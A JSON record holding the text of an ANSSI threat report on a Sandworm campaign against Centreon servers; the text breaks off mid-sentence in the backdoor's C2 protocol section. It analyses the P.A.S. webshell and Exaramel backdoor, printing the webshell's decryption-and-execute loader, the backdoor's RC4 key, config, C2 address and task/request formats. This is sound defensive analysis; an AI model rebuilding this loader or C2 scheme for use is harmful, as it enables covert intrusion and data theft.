{
    "id": "228cd0b3-ec1d-4962-9d3e-b6437f17bf5e",
    "created_at": "2022-10-25T16:48:15.125157Z",
    "updated_at": "2025-03-27T02:17:11.274177Z",
    "deleted_at": null,
    "sha1_hash": "5183b51959c244b3215f7e95e1560241e7e9a34a",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-03-03T10:17:53Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1705394,
    "plain_text": "# SANDWORM INTRUSION SET CAMPAIGN TARGETING CENTREON SYSTEMS\n\n### DESCRIPTION AND REMEDIATION\n\n###### 1.0 27/01/2021\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n## Table of contents\n\n**1** **Targeted systems . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **4**\n\n**2** **Malwares . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **4**\n2.1 Webshell P.A.S. 3.1.4 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n2.1.1 Context on the webshell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n2.1.2 Webshell upload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n2.1.3 Webshell characteristics . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n2.2 **Exaramel backdoor . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** 11\n2.2.1 Installation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n2.2.2 Analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n2.2.3 Backdoor versions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n2.3 ”SetUID” binary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\n**3** **Infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **21**\n3.1 Anonymisation infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n3.2 Command and Control infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\n**4** **Technics, tactics and procedures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **22**\n\n**5** **Links with the intrusion set Sandworm . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **22**\n\n**6** **Recommandations . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **23**\n6.1 Patch applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n6.2 Limit monitoring systems external exposure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n6.3 Server hardening . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\n**7** **Detection methods . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** **24**\n7.1 **P.A.S. webshell detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** 24\n7.1.1 YARA rules . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n7.1.2 Network detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26\n7.2 **Exaramel backdoor detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .** 31\n7.2.1 System artefacts . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n7.2.2 YARA rules . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n7.2.3 Network detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\n7.3 Indicators of compromise . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\n\n**8** **Bibliography** . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . **37**\n\n27/01/2021 Page 2 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### Summary\n\nANSSI has been informed of an intrusion campaign targeting the monitoring software Centreon distributed by the\nfrench company CENTREON which resulted in the breach of several French entities.\n\nThe first victim seems to have been compromised from late 2017. The campaign lasted until 2020.\n\nThis campaign mostly affected information technology providers, especially web hosting providers.\n\nOn compromised systems, ANSSI discovered the presence of a backdoor in the form of a webshell dropped on several Centreon servers exposed to the internet. This backdoor was identified as being the P.A.S. webshell, version\nnumber 3.1.4. On the same servers, ANSSI found another backdoor identical to one described by ESET and named\n**Exaramel [1].**\n\nThis campaign bears several similarities with previous campaigns attributed to the intrusion set named Sandworm.\n\nThis report provides technical information detailing this campaign: targeted systems (Section 1), detailed malwares\ncode analysis (Section 2), infrastructure (Section 3), tactics, techniques, and procedures (Section 4) and link with\nthe intrusion set Sandworm (Section 4). Recommandations (Section 6) and detection methods (Section 7) are suggested to better protect against this kind of attack and remediate eventual compromissions.\n\n27/01/2021 Page 3 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n### 1 Targeted systems\n\n**Centreon is a software developed by a company of the same name. Its purpose is to monitor applications, networks**\nand systems. An open-source version exists under the GPL 2.0 licence. The editor-issued virtual image is based on\nthe CENTOS operating system. However, it is also available on other LINUX operating systems.\n\nThe simplified software architecture is divided between a monitoring core named Centreon Engine and a graphical\nuser interface named Centreon Web UI [2]. The default installation settings use the APACHE server and serve the\ninterface on the URL http://<IP>/centreon.\n\nCompromised servers identified by ANSSI ran the CENTOS operating system. Centreon had not recently been updated. The most recent installation version studied by ANSSI was 2.5.2.\n\nThe initial compromise method is not known.\n\n### 2 Malwares\n\n#### 2.1 Webshell P.A.S. 3.1.4\n\n##### 2.1.1 Context on the webshell\n\nThe P.A.S. webshell was developed by an ukrainian student, Jaroslav Volodimirovich Panchenko, who used the nickname Profexer [3][4]. It was developed in PHP and features a characteristic password-based encryption [5]. This tool\nwas available through a form on his website, where a user had to provide a password to receive a custom webshell.\nThe form suggested a donation to the developer. It was commonly used, including during a WORDPRESS website\nattack [6] [7].\n\nIn december 2016, the DEPARTMENT OF HOMELAND SECURITY published a report known as Grizzly Steppe [8] that\npresented tools, techniques and infrastructure used during various attacks on the 2016 U.S. elections. Its appendix\nfeatures a webshell that the DHS named Fobushell, an alternate name for the P.A.S. webshell.\n\nSome webshells included in the Grizzly Steppe report [8] used the version numbers 3.0.10 and 3.1.0. Their passwords\nwere root, avto, 123123, we kome and |F3Jk 6k6. The report does not mention the versions and passwords for\nseveral samples.\n\nFollowing the report, the developer stopped its webshell generation service and contacted the U.S. authorities [3].\nThe last known version of this webshell was the 4.1.1. However, many samples of this webshell remain publicly\navailable.\n\n##### 2.1.2 Webshell upload\n\n**Centreon servers analysed by ANSSI analysed presented several illegitimate PHP files. Further analysis allowed**\ntheir identification as versions of the P.A.S. webshell, the source code displaying the version number 3.1.4. They\ncould be found at the following paths:\n\n  - /usr/local/centreon/www/search.php\n\n  - /usr/share/centreon/www/search.php\n\n  - /usr/share/centreon/www/modules/Discovery/include/DB−Drop.php\n\nThe first files were thus reachable through internet using the URL http://<IP>/centreon/search.php.\n\n27/01/2021 Page 4 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n_Commentary: Even though the 3.1.4 version does not seem to be publicly available, it is still easy to modify the webshell_\n_source code. For example, it is possible to trivially alter the password or the version number._\n\nAnother illegitimate PHP file was identified at the path /usr/share/centreon/www/htmlHeader.php. This file was\ndeleted before ANSSI could recover and analyse it.\n\nOn all servers analysed by ANSSI, webshell-related files were created by the apache user.\n\n##### 2.1.3 Webshell characteristics\n\nThe following section exposes the results of an analysis based on the P.A.S. sample identified by the following\nhashes:\n\n**P.A.S. sample hashes**\n\nAlgorithm Value\n\nMD5 84837778682450cdca43d1397afd2310\n\nSHA-1 c69db1b120d21bd603f13006d87e817fed016667\n\nSHA-256 893750547255b848a273bd1668e128a5e169011e79a7f5c7bb86cc5d7b2153bc\n\n###### 2.1.3.1 Webshell encryption\n\nOne of the distinctive characteristics of the malware is the use of a specific encryption layer to both conceal its\ninternals from scrutiny and enforce an access control when deployed on a compromised host. This mechanism,\npreviously documented by Trustwave [5], will be quickly reviewed thereafter.\n\nThe webshell PHP file is composed of two main parts:\n\n    - the encrypted and base64 encoded core functionalities to be executed once activated and compressed;\n\n    - a form backed by the decryption mechanism to process the password supplied by the operator. The code\nsnippet below shows a formatted and deobfuscated version of this part of the webshell.\n\n1 `$password = isset($_POST['password']) ? $_POST['password'] : (isset($_COOKIE['password']) ?`\n\n_�→_ `$_COOKIE['password']:NULL);`\n\n2\n\n3 `if($password!==NULL)`\n\n4 `{`\n\n5 `$password = md5($password).substr(MD5(strrev($password)),0,strlen($password));`\n\n6 `for($counter = 0; $counter < 15571; $counter++)`\n\n7 `{`\n\n8 `$webshell_data[$counter] = chr(( ord($webshell_data[$counter]) -`\n\n_�→_ `ord($password[$counter]))%256);`\n\n9 `$password .= $webshell_data[$counter];`\n\n10 `}`\n\n11\n\n12 `if($webshell_data = @gzinflate($webshell_data))`\n\n13 `{`\n\n14 `if(isset($_POST['password']))`\n\n15 `@setcookie('password', $_POST['password']);`\n\n16 `$counter=create_function('',$webshell_data);`\n\n17 `unset($password,$webshell_data);`\n\n18 `$counter();`\n\n19 `}`\n\n20 `}`\n\n27/01/2021 Page 5 of 38\n\n|Col1|P.A.S. sample hashes|\n|---|---|\n|Algorithm|Value|\n|MD5|84837778682450cdca43d1397afd2310|\n|SHA-1|c69db1b120d21bd603f13006d87e817fed016667|\n|SHA-256|893750547255b848a273bd1668e128a5e169011e79a7f5c7bb86cc5d7b2153bc|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\nThe decryption logic can be described as follows.\n\n  - The webshell data is first base64 decoded;\n\n  - the password is received via the login form, depicted in figure 2.1, through a POST parameter variable or in a\ncookie if the login phase has already happened.\n\nFig. 2.1: P.A.S. login page\n\n_Commentary: The name of the variable used to convey the password changes in the different versions of the webshell._\n_However it mainly follows the same structure in available samples. The one defined in our case is g__g_. Other_\n_ones extracted from available P.A.S. samples include l___l_, _f___f or wp__wp._\n\n  - A decryption keystream buffer is built using the MD5 hash of the password, concatenated with a second value\nbased on the MD5 hash computed from the password in reverse order and truncated to the length of the password.\n\n|rd|Col2|Col3|\n|---|---|---|\n|Reverse order|||\n||Reverse order||\n||||\n\n\nKeystream buffer\n\n\npassword\n\n**MD5** Reverse order\n\ndrowssap\n\nTruncated to\n\n**MD5** password length\n\nExtended while decrypting\n\nFig. 2.2: P.A.S. decryption key setup\n\n|Col1|drowssap MD5|\n|---|---|\n|||\n\n\n\n  - The program then enters a loop where for each iteration a character from the decryption key buffer is subtracted from a byte of the encrypted webshell. The result is both used as the decrypted data and appended\nto the key buffer, thus building the keystream on the fly.\n\n  - At the end, the decrypted buffer is passed to PHP’s gzinflate function in order to uncompress it.\n\n27/01/2021 Page 6 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n\nconstructed step-by-step\n\n|k|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n\n\nAppend to decrypted\n\n\nInitial keystream\n\nKeystream buffer k\n\nDecrypt\n\n**m** **-** **k**\n\nWebshell encrypted part m\n\nDecrypted content\n\nFig. 2.3: Decryption loop\n\n|r k Decrypt Append to keystream m - k rt m|Col2|Col3|\n|---|---|---|\n|m - k|||\n|rt|||\n||m||\n\n\n\n  - At that point, if the buffer decryption was correct, the inflate action should succeed and the newly available\ncode run. If it is not already the case, i.e. if it is the initial connection, the password is set in a cookie for future\nuse.\n\n###### 2.1.3.2 Functionalities\n\nThe webshell has several functionalities grouped by categories within sub-menus accessible from the interface’s\nnavigation bar. The malware is built on a main view which is updated to reflect navigation choices whenever a subfunction webshell is started. The different choices will be discussed below. As a global overview, each function of\nthe webshell is built upon a form that seeks to get the task parameters before running it, then update the interface\nin order to display the results.\n\n_Commentary: The field names for these forms are statically defined by the webshell code. Several detection strategies are_\n_detailed in the appendix._\n\n_Explorer Menu_\n\nThe first webshell menu regroups file handling tasks. It offers the following actions:\n\n  - list files and several of their characteristics such as extension, file size, ownership or permissions;\n\n  - interact with a file to to move, copy, delete or download it;\n\n  - rename a file;\n\n  - create a new file or modify an already existing file;\n\n  - upload a file on the compromised host.\n\n27/01/2021 Page 7 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\nFig. 2.4: Snapshot of the Explorer menu of P.A.S.\n\nWhen editing a file, it is possible to:\n\n  - change its permissions;\n\n  - change its group;\n\n  - change its last modification date.\n\nRegarding the last options, if the file does exists, by default the last modification date is set to the original file last\nmodification date. If not, the webshell uses the last modification date of the folder.\n\nFig. 2.5: File edition interface of P.A.S.\n\n27/01/2021 Page 8 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n_Searcher Menu_\n\nThe webshell has a function enabling the search of specific elements within the file tree of the compromised host’s\nfile system. This search can be set within a specific path with the following parameters:\n\n  - the properties of the elements (read/write access or all);\n\n  - the nature of the searched element (folder, file or all);\n\n  - a pattern to match within the element name supporting wildcard characters * and ?;\n\n  - a character chain appearing in the content of the targeted file.\n\nFig. 2.6: Search menu of P.A.S.\n\n_SQL-client menu_\n\nThe webshell P.A.S. can interact with SQL databases. The matching interface represented in figure 2.7 is divided in\nthree parts.\n\n  - The top panel is used to define database connexion parameters. The malware SQL client can use three database\nformats: MySQL, MSSQL and PostgreSQL.\n\n  - The left part lists accessible databases and tables.\n\n  - The central part lists the database contents and the query that was used.\n\nFig. 2.7: SQL client menu of P.A.S.\n\n27/01/2021 Page 9 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\nOther than database navigation, the malware can also to extract the content of the database in order to get a local\ncopy.\n\n_Network Tools Menu_\n\nFrom this menu, the P.A.S. webshell can perform three distinct network tasks:\n\n  - create a bind shell with a listening port;\n\n  - create a reverse shell with a distant address as a parameter;\n\n  - run a network scan in order to find open ports and listening services on a machine.\n\nThe webshell creates distant shell with PERL scripts. These scripts are run using code snippets completed with adequate parameters and assembled to form the final script. Its file is stored in a sub-folder of /tmp/ and is be deleted\nafter being run with unlink.\n\n_Passwd BruteForce Menu_\n\nThe P.A.S. webshell has a brute force password attack function against six services: SSH, FTP, POP3, MySQL, MSSQL\nand PostgreSQL. This function can be run by selecting one or more services, as well as predefined user/passwords\nas presented in figure 2.8.\n\nFig. 2.8: Passwd BruteForce menu interface\n\n_CMD Menu_\n\nThe CMD menu is a minimalistic interface allowing the execution of a command or the evaluation of a PHP expression.\n\n_Server info Menu_\n\nThe last P.A.S. menu has two preset actions enabling the quick collection of informations on the compromised host.\nThe first will run the command phpinfo to list PHP server configuration details. The second action, available only\nfor LINUX systems, allows to display the /etc/passwd file.\n\n27/01/2021 Page 10 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n#### 2.2 Exaramel backdoor\n\n**Exaramel is a backdoor first publicly reported by ESET in 2018 [1]. Two samples were identified, one targeting the**\nWINDOWS operating system and the other targeting LINUX operating systems. A sample of the LINUX version was\nuploaded to VIRUSTOTAL in october 2019, as stated by ESET researcher Anton Cherepanov [9]. This sample hashes\nare as follows:\n\n**Exaramel sample hashes available on VIRUSTOTAL**\n\nAlgorithm Value\n\nMD5 8eff45383a7a0c6e3ea6d526a599610d\n\nSHA-1 f74ea45ad360c8ef8db13f8e975a5e0d42e58732\n\nSHA-256 c39b4105e1b9da1a9cccb1dace730b1c146496c591ce0927fb035d48e9cb5c0f\n\n##### 2.2.1 Installation\n\nANSSI’s investigation allowed to identify the use of Linux/Exaramel for multiple victims of this campaign.\n\nThe backdoor’s name is centreon_module_linux_app64. It has been found in the Centreon server folder, either\nat /usr/share/centreon/www/ or at /usr/local/centreon/www/modules/.\n\nIn the same folder, several other files have been found including a script named respawner.sh, configuration files\n```\nconfig.json and configtx.json, as well as several files named with a number followed by the .rep extension.\n\n```\nTheir role is detailed further down in this analysis.\n\nLogs indicating daily execution of respawner.sh by CRON were observed from november 2017 to february 2018.\nIts content could not be retrieved, its role is thus unknown.\n\nAll Linux/Exaramel-related files analysed by ANSSI were created by the apache user.\n\nAnalysis performed by ANSSI did not allow to identify the origin of the backdoor binary.\n\n##### 2.2.2 Analysis\n\nFor this analysis, Linux/Exaramel will simply be referred as Exaramel.\n\n**Exaramel is written in GO. Its source code length is approximately 1400 lines. It is divided in 5 packages: main,**\n```\nworker, configur, scheduler and networker. Besides GO standard library, Exaramel uses two publicly-available\n\n```\nthird-party packages.\n\n  - github.com/robfig/cron\n\n  - github.com/satori/go.uuid\n\nThis analysis uses the following sample:\n\n**Linux/Exaramel hash**\n\nAlgorithm Value\n\nMD5 92ef0aaf5f622b1253e5763f11a08857\n\nSHA-1 a739f44390037b3d0a3942cd43d161a7c45fd7e7\n\nSHA-256 e1ff729f45b587a5ebbc8a8a97a7923fc4ada14de4973704c9b4b89c50fd1146\n\n27/01/2021 Page 11 of 38\n\n|Algorithm|Value|\n|---|---|\n|MD5|8eff45383a7a0c6e3ea6d526a599610d|\n|SHA-1|f74ea45ad360c8ef8db13f8e975a5e0d42e58732|\n|SHA-256|c39b4105e1b9da1a9cccb1dace730b1c146496c591ce0927fb035d48e9cb5c0f|\n\n|Col1|Linux/Exaramel hash|\n|---|---|\n|Algorithm|Value|\n|MD5|92ef0aaf5f622b1253e5763f11a08857|\n|SHA-1|a739f44390037b3d0a3942cd43d161a7c45fd7e7|\n|SHA-256|e1ff729f45b587a5ebbc8a8a97a7923fc4ada14de4973704c9b4b89c50fd1146|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\nThis sample is an ELF compiled for x86 64 bits architectures and Linux operation systems. Symbols and debug\ninformations were not wiped. The compiler used is:\n\n« go1.8.3 (2017-05-24T18:14:11Z) »\n\n###### 2.2.2.1 Notations\n\nThe following variables will be used.\n\n  - $EXARAMEL_DIR, folder where Exaramel is written.\n\n  - $EXARAMEL_PATH, full path of Exaramel binary.\n\n  - $EXARAMEL_GUID, UUID field of Exaramel configuration.\n\n  - $SERVER_URL, Exaramel Command and Control URL.\n\n  - $DEFAULT_SERVER_IP, Command and Control IP address in the default configuration.\n\n###### 2.2.2.2 Comparison with previous version\n\nOnly minor differences were observed between the analysed sample and ESET’s sample, listed below.\n\nDifference ESET sample c39b410[...] ANSSI sample e1ff729[...]\n\nConfiguration encryption key s0m3t3rr0r odhyrfjcnfkdtslt\n\nConfiguration file name config.json configtx.json\n\nUnix socket name /tmp/.applock /tmp/.applocktx\n\nC2 URL setting process (App.SetServer) At the end of the list; contacted last At the beginning of the list; contacted first\n\nDefault C2 IP address 176.31.225.204 $DEFAULT_SERVER_IP\n\n###### 2.2.2.3 Operation overview\n\n**Exaramel is a remote administration tool supporting a limited set of tasks, including: file copy from Command**\nand Control server to Exaramel host, file copy from host to Command and Control server and shell command execution. Exaramel communicates using HTTPS with its Command and Control server in order to get the list of tasks\nit is supposed to run. Exaramel persists on the system using different methods.\n\n**Exaramel execution can be divided in two parts: initialisation and the main loop.**\n\n_Initialisation_\n\n1. Exaramel creates a UNIX socket /tmp/.applocktx. This socket is not used to communicate but only to avoid\nconcurrent executions of Exaramel. If the socket creation fails with an error code stating that the local\naddress is already in use, Exaramel halts its execution and writes to the standard output: App has already\n```\n   started!\n\n```\n2. Exaramel sets a handler for the following signals: SIGINT, SIGTERM, SIGQUIT and SIGKILL. The handler terminates the Exaramel process.\n\n3. Exaramel reads its configuration file. More details about this behaviour are available in Section 2.2.2.4.\n\n4. Exaramel checks if a persistence method is activated. If this is not the case, Exaramel tries to become persistent. More details about this behaviour are available in Section 2.2.2.8.\n\n27/01/2021 Page 12 of 38\n\n|Difef rence|ESET sample c39b410[...]|ANSSI sample e1ff729[...]|\n|---|---|---|\n|Configuration encryption key|s0m3t3rr0r|odhyrfjcnfdk tslt|\n|Configuration file name|config.json|configtx.json|\n|Unix socket name|/tmp/.applock|/tmp/.applocktx|\n|C2 URL setting process (App.SetServer)|At the end of the list; contacted last|At the beginning of the list; contacted first|\n|Default C2 IP address|176.31.225.204|$DEFAULT_SERVER_IP|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n_Main loop_\n\nThe main loop body can be summed up in four steps:\n\n1. Exaramel contacts its Command and Control server to get a list of tasks to execute.\n\n2. Exaramel runs the tasks it received. Some might run in the background indefinitely.\n\n3. Exaramel contacts its Command and Control server to get the time interval it is supposed to spend suspended\nwithout contacting the server.\n\n4. Exaramel suspends itself until the end of the time interval.\n\nA detailed description of this loop is presented in figure 2.9.\n\nFig. 2.9: Detailed execution flow of Exaramel main loop.\n\n_Command line arguments_\n\n**Exaramel accepts an optional command line argument. It can take two values.**\n\n  - delete: Exaramel self-deletes. It uninstall its persistence, deletes its configuration file and stops its execution.\n\n  - status: at the end of each main loop iteration, Exaramel prints a summary of its internal state on the\nstandard output.\n\n27/01/2021 Page 13 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n###### 2.2.2.4 Configuration\n\n**Exaramel stores its configuration in a file named configtx.json in the folder $EXARAMEL_DIR. This file is encrypted**\nusing the RC4 algorithm and the key odhyrfjcnfkdtslt. Once decrypted, the file is in a JSON format. Its specification is given below in GO syntax.\n\n1 `Config struct {`\n\n2 `// URLs server list`\n\n3 `Hosts []string`\n\n4 `// Proxy HTTP URL to connect to servers (optional)`\n\n5 `Proxy string`\n\n6 `// EXARAMEL version`\n\n7 `Version string`\n\n8 `// UUID, used probably to identify an Exaramel instance`\n\n9 `Guid string`\n\n10 `// Time span of the last run pause between two mails loop run.`\n\n11 `// This field is updated before each execution pause.`\n\n12 `Next int64`\n\n13 `// Date when EXARAMEL last paused its execution`\n\n14 `Datetime string`\n\n15 `// Timeout value given to HTTP/HTTPS implementation`\n\n16 `Timeout int`\n\n17 `// Time during which EXARAMEL paused its execution between two`\n\n18 `// main loop iterations. This field is used when EXARAMEL`\n\n19 `// fails to get a time interval from its control server.`\n\n20 `Def int64`\n\n21 `}`\n\nDuring the initialisation phase, Exaramel tries to read its configuration file. If it fails, it uses its default configuration\nand creates a new configuration file. The default configuration is given below:\n\n1 `{`\n\n2 `\"Hosts\":[\"https://$DEFAULT\\_SERVER_IP/api/v1\"],`\n\n3 `\"Proxy\":\"\",`\n\n4 `\"Version\":\"1\",`\n\n5 `\"Next\":20,`\n\n6 `\"Datetime\":\"\",`\n\n7 `\"Timeout\":30,`\n\n8 `\"Def\":20`\n\n9 `}`\n\nWhen the default configuration is used, the GUID field is generated with the uuid GO package.\n\nA the end of the main loop run, the configuration is rewritten to the same file. It is deleted when Exaramel selfdeletes.\n\n###### 2.2.2.5 Tasks lists\n\n    - App.Delete\n\n**– Description: Exaramel self-deletes. It uninstalls the persistence, deletes its configuration file and stops**\nitself.\n\n**– Argument: none.**\n\n    - App.SetServer\n\n**– Description: adds a server URL to the configuration field Hosts. The new URL is added at the beginning**\nof the list\n\n27/01/2021 Page 14 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n**– Argument: server URL.**\n\n  - App.SetProxy\n\n**– Description: sets a new value for the configuration field Proxy.**\n\n**– Argument: proxy URL.**\n\n  - App.SetTimeout\n\n**– Description: sets a new value for the configuration field Timeout.**\n\n**– Argument: timeout in seconds.**\n\n  - App.Update\n\n**– Description: downloads a file from the Command and Control server, replace the current binary with it,**\nruns it and halts itself.\n\n**– Argument: filename of the new Exaramel version.**\n\n  - IO.ReadFile\n\n**– Description: copies a file from Exaramel host to Command and Control server.**\n\n**– Argument: file path on the Exaramel host.**\n\n  - IO.WriteFile\n\n**– Description: copies a file from Command and Control server to Exaramel host.**\n\n**– Argument: file path on the Exaramel host.**\n\n  - OS.ShellExecute\n\n**– Description: runs a shell command and sends a copy of both standard and error output to the Command**\nand Control server.\n\n**– Argument: shell command.**\n\n###### 2.2.2.6 Reports\n\nOnce the task is run, Exaramel produces a report with no particular formatting rules. These reports are sent to the\nCommand and Control server either once the task ends or when the main loop starts again.\n\nMost reports are saved to files before being sent to the Command and Control server. Report files are created in\nthe $EXARAMEL_DIR folder and are named $TASK_ID.rep where $TASK_ID is the numeric identification of the task.\n\nWhen a report is succesfully sent, the corresponding file is deleted. However, if it fails, the file is kept and Exaramel\nwill try to send it again at the start of each main loop run.\n\nTask Report content Report file\n\nApp.Delete Status message no\n\nApp.SetServer Status message yes\n\nApp.SetProxy Status message yes\n\nApp.SetTimeout Status message yes\n\nApp.Update Status message only if it fails\n\nIO.ReadFile File to read or error message only if it fails\n\nIO.WriteFile Status message yes\n\nOS.ShellExecute Standard output of the shell process yes\n\n**Exaramel does not keep internally a list of reports waiting to be sent. At the beginning of the main loop, Exaramel**\ntries to send reports in bulk to its Command and Control server. In order to list these files, Exaramel lists the directory $EXARAMEL_DIR and all its subdirectory recursively in order to find report files. Exaramel considers that a\nfile is a report if its name contains the regular expression .rep.\n\n27/01/2021 Page 15 of 38\n\n|Task|Report content|Report file|\n|---|---|---|\n|App.Delete|Status message|no|\n|App.SetServer|Status message|yes|\n|App.SetProxy|Status message|yes|\n|App.SetTimeout|Status message|yes|\n|App.Update|Status message|only if it fails|\n|IO.ReadFile|File to read or error message|only if it fails|\n|IO.WriteFile|Status message|yes|\n|OS.ShellExecute|Standard output of the shell process|yes|\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n###### 2.2.2.7 Communication\n\n**Exaramel communicates with its Command and Control server using HTTPS. To do so it uses the standard library of**\nthe GO language. Exaramel does not check the certificate exposed by the server. Data exchanged through HTTPS\nare mostly formatted in JSON but not exclusively.\n\n**Exaramel tries to reach each of the server specified in the configuration (Hosts field) until it finds one that responds**\nto its request, without checking the HTTP status code. This server will become its Command and Control server.\nFurther communications will be sent only to this server.\n\n**Exaramel uses six different types of requests to communicate with its Command and Control server. They are**\ndetailed below.\n\n_Get Authorization_\n\nIt is the first request run by Exaramel. It is used to identify an active server within the configuration list. Exaramel\nruns a POST request to $SERVER_URL/auth/app. The following information is sent (percent-encoded) in the body\nof the POST request.\n\n    - guid: $EXARAMEL_GUID.\n\n    - whoami: result of the shell command whoami.\n\n    - platform: result of the shell command uname -a.\n\n    - version: version number (configuration field Version).\n\n    - generation: hardcoded and set to 1.\n\nThe server is expected to respond either with a RespAuth or with a RespError structure, both in JSON.\n\n1 `RespAuth struct{`\n\n2 `Auth struct {`\n\n3 `GUID string `json:\"guid\"``\n\n4 `AuthResult int `json:\"auth_result\"``\n\n5 `} `json:\"response\"``\n\n6 `}`\n\n7\n\n8 `RespError struct{`\n\n9 `Error struct {`\n\n10 `Code uint32 `json:\"error_code\"``\n\n11 `Message string `json:\"error_msg\"``\n\n12 `} `json:\"response\"``\n\n13 `}`\n\nAn answer is considered positive if Auth.AuthResult is set to 1. But in practice, the server answer does not have\nmuch impact. If the server answers, it will be chosen by Exaramel as its Command and Control server.\n\nAs described on the left part of figure 2.9, if Exaramel receives an error to any other type of request, it will try to\nfind a new Command and Control server.\n\n_Send Report_\n\nIn order to send a report to its Command and Control server, Exaramel uses a POST request to the url $SERVER_```\n  URL/tasks.report/. The body request is encoded in multipart/form-data. It contains three parts named file,\n  guid et task_id.\n\n```\nThe server is expected to respond either with a Reports or with a RespError structure, both in JSON.\n\n27/01/2021 Page 16 of 38\n\n\n-----\n\nSandworm intrusion set campaign targeting Centreon systems\n\n1 `Reports struct{`\n\n2 `Response struct {`\n\n3 `ID string `json:\"guid\"``\n\n4 `CommandID string `json:\"id\"``\n\n5 `Status int `json:\"status\"``\n\n6 `} `json:\"response\"``\n\n7 `}`\n\nIf the answer is positive, the field Response.Status is set to 1.\n\n_Get Tasks_\n\nin order to get new tasks from its Command and Control server, Exaramel runs a GET request to $SERVER_```\n  URL/tasks.get/$EXARAMEL_GUID.\n\n```\nThe server is expected to respond either with a Tasks or with a RespError structure, both in JSON.\n\n1 `Tasks struct{`\n\n2 `// Liste de tâches`\n\n3 `Response []TaskResponse `json:\"response\"``\n\n4 `}`\n\n5\n\n6 `type TaskResponse struct{`\n\n7 `// Task identification`\n\n8 `ID uint32 `json:\"id\"``\n\n9 `// Task type, e.g. \"OS.ShellExecute\" or \"IO.ReadFile\"`\n\n10 `Method string `json:\"metod\"``\n\n11 `// Optional argument needed for some tasks`\n\n12 `Arguments string `json:\"arguments\"``\n\n13 `// Not used`\n\n14 `Attachment int `json:\"attachment\"``\n\n15 `// Only for \"OS.ShellExecute\" task. If the field is non zero, the shell process`\n\n16 `// will be run in the background.`\n\n17 `AnswerWait int `json:\"answer_wait\"``\n\n18 `// No real impact in task processing`\n\n19 `DoAsync int `json:\"answer_async\"``\n\n20 `// If the field is non zero, the report will be sent as soon as the task ends`\n\n21 `AnswerImmediately int `json:\"answer_immediately\"``\n\n22 `// Max task duration. Once it is reached the task`\n\n23 `// is left in the background and a report is produced.`\n\n24 `WaitOutputTime int `json:\"wait_output_time\"``\n\n25 `}`\n\n_Commentary: When a shell command runs in the background (AnswerWait == 0 or WaitOutputTime is over), data_\n_written to standard and error outputs are lost._\n\n_Get File_\n\nIn order to download a file from its Command and Control server, Exaramel runs a GET request to $SERVER_```\n  URL/attachment.get/EXARAMEL_GUI/$FILE_ID. The file identification number, which is noted in this analysis\n  $FILE_ID, is always equal to the corresponding task identification number.\n\n```\nThe server is expected to 